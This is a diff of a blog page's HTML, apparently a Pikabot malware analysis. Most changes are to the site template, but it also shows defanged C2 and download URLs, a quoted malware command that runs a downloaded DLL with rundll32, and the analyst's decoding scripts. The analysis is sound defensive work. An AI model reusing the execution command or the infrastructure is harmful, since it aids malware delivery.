@@ -4,20 +4,27 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Pikabot deep analysis - d01a</title><meta name="Description" content="Pikabot loader and core deep analysis"><meta property="og:title" content="Pikabot deep analysis" />
-<meta property="og:description" content="Pikabot loader and core deep analysis" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://d01a.github.io/pikabot/" /><meta property="og:image" content="https://d01a.github.io/pikabot/featured-image.jpg"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-07-31T09:04:49+08:00" />
-<meta property="article:modified_time" content="2023-08-01T03:18:11+03:00" /><meta property="og:site_name" content="d01a" />
+        <title>Pikabot deep analysis - d01a</title><meta name="Description" content="Pikabot loader and core deep analysis"><meta property="og:url" content="https://d01a.github.io/pikabot/">
+  <meta property="og:site_name" content="d01a">
+  <meta property="og:title" content="Pikabot deep analysis">
+  <meta property="og:description" content="Pikabot loader and core deep analysis">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-07-31T09:04:49+08:00">
+    <meta property="article:modified_time" content="2023-08-01T03:18:11+03:00">
+    <meta property="article:tag" content="Malware Analysis">
+    <meta property="article:tag" content="Reverse Engineering">
+    <meta property="og:image" content="https://d01a.github.io/pikabot/featured-image.jpg">
 
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://d01a.github.io/pikabot/featured-image.jpg"/>
-<meta name="twitter:title" content="Pikabot deep analysis"/>
-<meta name="twitter:description" content="Pikabot loader and core deep analysis"/>
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://d01a.github.io/pikabot/featured-image.jpg">
+  <meta name="twitter:title" content="Pikabot deep analysis">
+  <meta name="twitter:description" content="Pikabot loader and core deep analysis">
 <meta name="application-name" content="d01a">
-<meta name="apple-mobile-web-app-title" content="d01a"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/Luffy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://d01a.github.io/pikabot/" /><link rel="prev" href="https://d01a.github.io/aurora-stealer-builder/" /><link rel="next" href="https://d01a.github.io/syscalls/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<meta name="apple-mobile-web-app-title" content="d01a">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/Luffy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://d01a.github.io/pikabot/" /><link rel="prev" href="https://d01a.github.io/aurora-stealer-builder/" /><link rel="next" href="https://d01a.github.io/syscalls/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
@@ -32,8 +39,8 @@
                             "url": "https:\/\/d01a.github.io\/pikabot\/featured-image.jpg",
                             "width":  1200 ,
                             "height":  628 
-                        }],"genre": "posts","keywords": "Malware Analysis, Reverse Engineering","wordcount":  3884 ,
-        "url": "https:\/\/d01a.github.io\/pikabot\/","datePublished": "2023-07-31T09:04:49+08:00","dateModified": "2023-08-01T03:18:11+03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "posts","keywords": "Malware Analysis, Reverse Engineering","wordcount":  3646 ,
+        "url": "https:\/\/d01a.github.io\/pikabot\/","datePublished": "2023-07-31T09:04:49+08:00","dateModified": "2023-08-01T03:18:11+03:00","publisher": {
             "@type": "Organization",
             "name": "Mohamed Adel","logo": {
                     "@type": "ImageObject",
@@ -46,16 +53,38 @@
             },"description": "Pikabot loader and core deep analysis"
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-1" class="typeit"></span></a>
+            <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span>d01a</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
                 </a></div>
         </div>
     </div>
@@ -63,24 +92,45 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+                <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span>d01a</a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
             </a></div>
     </div>
-</header><main class="main">
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pikabot deep analysis</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://d01a.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mohamed Adel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware-analysis/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware Analysis</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-31">2023-07-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3884 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;19 minutes&nbsp;</div>
+            <div class="post-meta-line"><span class="post-author"><a href="https://d01a.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Mohamed Adel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware-analysis/"><i class="far fa-folder" aria-hidden="true"></i>Malware Analysis</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-31">2023-07-31</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;3646 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;18 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -172,94 +222,94 @@ I Enabled PowerShell Logging and Transcript logging that get the full PowerShell
 <li>Note: Every variable contains not only one base64 encoded string but multiple, separated by a character. e.g., <code>$rifflers</code> uses <code>q</code> character as a separator and <code>$gentlewomanlike</code> that contains valid IP list uses <code>XO</code> as a separator. Just delete the separator and decode the string will work.</li>
 </ul>
 <table>
-<thead>
-<tr>
-<th>URL</th>
-<th>Status</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>http[://]Supermysteries[.]creditcard</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]205.194.71[.]236</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]punishes[.]vacations</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]profiters[.]construction</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]83.99.144[.]199</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]whittret[.]hamburg</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]AdelochordaIntroverse[.]pizza</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]98.81.136[.]149</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]UnredeemedlyBeadeyes[.]land</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]81.179.42[.]197</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]Leavings[.]florist</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]55.112.208[.]170</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]wilded[.]parts</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]AlbergatriceRepaginated[.]xxx</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]heptameron[.]se</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]51.238.155[.]130</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]Bigeminy[.]tokyo</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]144.206.78[.]90</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>https[://]zeatin[.]marketing</td>
-<td>Not found</td>
-</tr>
-<tr>
-<td>http[://]countervene[.]agency</td>
-<td>Not found</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>URL</th>
+          <th>Status</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>http[://]Supermysteries[.]creditcard</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]205.194.71[.]236</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]punishes[.]vacations</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]profiters[.]construction</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]83.99.144[.]199</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]whittret[.]hamburg</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]AdelochordaIntroverse[.]pizza</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]98.81.136[.]149</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]UnredeemedlyBeadeyes[.]land</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]81.179.42[.]197</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]Leavings[.]florist</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]55.112.208[.]170</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]wilded[.]parts</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]AlbergatriceRepaginated[.]xxx</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]heptameron[.]se</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]51.238.155[.]130</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]Bigeminy[.]tokyo</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]144.206.78[.]90</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>https[://]zeatin[.]marketing</td>
+          <td>Not found</td>
+      </tr>
+      <tr>
+          <td>http[://]countervene[.]agency</td>
+          <td>Not found</td>
+      </tr>
+  </tbody>
 </table>
 <p>Going back to the script, it iterates through the variable <code>$gentlewomanlike</code> using <code>XO</code> as a separator between each Base64-encoded string. There are more unused URLs in the script. But the used strings that initiate a request t them are:</p>
 <ul>
@@ -271,15 +321,13 @@ I Enabled PowerShell Logging and Transcript logging that get the full PowerShell
 <li>http[://]192.121.17[.]68/9Cm9EW/BVteE</li>
 </ul>
 <p>After Downloading the DLL, rundll32 to run It.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">start rundll32 $env:ProgramData\\forerankSomnolescent.EuthanasyUnblushingly,vips;MITLicense
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="second-stage-pikabot-loader">Second stage: Pikabot Loader</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">start rundll32 $env:ProgramData\\forerankSomnolescent.EuthanasyUnblushingly,vips;MITLicense</span></span></code></pre></div></div>
+<h3 id="second-stage-pikabot-loader">Second stage: Pikabot Loader</h3>
 <p>To get the final payload, I used <code>unpacme</code>. for the unpacked sample, see <a href="https://www.unpac.me/results/0a65b4be-8ae6-4ced-8e2e-f333e85ac369#/" target="_blank" rel="noopener noreffer ">unpacme result</a></p>
 <blockquote>
 <p>NOTE: The unpacked DLL is broken so, if you want to debug the sample you can use this sample</p>
@@ -326,22 +374,12 @@ The decoding operation takes a constant pattern as follows.</p>
 <blockquote>
 <p>NOTE: The script did not run with me if the DLL is not located in a sub path of rootfs. For more information about the installation process look at the documentation or this blog.</p>
 </blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">argv</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">pika.dll&#34;</span><span class="p">]</span>
@@ -351,10 +389,8 @@ The decoding operation takes a constant pattern as follows.</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">begin</span><span class="o">=</span><span class="mh">0x10005542</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mh">0x10005588</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x40</span> <span class="p">,</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img
+</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png"
@@ -383,166 +419,12 @@ The decoding operation takes a constant pattern as follows.</p>
 <p>Qiling script will be helpful if you want to get a specific string.</p>
 </blockquote>
 <p>I wrote this script to manually decode the strings. can be found on my <a href="https://github.com/d01a/IDAPython_scripts/blob/master/Pikabot_string_decode.py" target="_blank" rel="noopener noreffer ">github</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span><span class="lnt">152
-</span><span class="lnt">153
-</span><span class="lnt">154
-</span><span class="lnt">155
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idc</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idaapi</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idautils</span>
@@ -696,10 +578,8 @@ The decoding operation takes a constant pattern as follows.</p>
 </span></span><span class="line"><span class="cl">      <span class="n">set_comment</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>Result:</strong>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><strong>Result:</strong>
 Works well for most of the strings. But it fails at two cases where the strings not in the pattern explained previously or it uses <code>SIMD</code> instructions like <code>psubb</code>. We can decode them with the first script.</p>
 <p><img
         class="lazyload"
@@ -712,26 +592,26 @@ Works well for most of the strings. But it fails at two cases where the strings 
 <h3 id="dynamic-api-resolving">Dynamic API resolving</h3>
 <p>the malware uses <code>LoadLibraryA</code> and <code>GetProcAddress</code> to get the function Address. They choses the appropriate DLL by passing a flag in the first Argument.</p>
 <table>
-<thead>
-<tr>
-<th>flag</th>
-<th>DLL</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>Kernel32.dll</td>
-</tr>
-<tr>
-<td>2</td>
-<td>User32.dll</td>
-</tr>
-<tr>
-<td>3</td>
-<td>ntdll.dll</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>flag</th>
+          <th>DLL</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>Kernel32.dll</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>User32.dll</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>ntdll.dll</td>
+      </tr>
+  </tbody>
 </table>
 <h3 id="anti-analysis">Anti Analysis</h3>
 <p>The malware uses a series of anti-debugging checks before continuing, the checks used:</p>
@@ -808,22 +688,12 @@ Then, it is called <code>GetThreadContext</code> passing reused allocated memory
         data-sizes="auto"
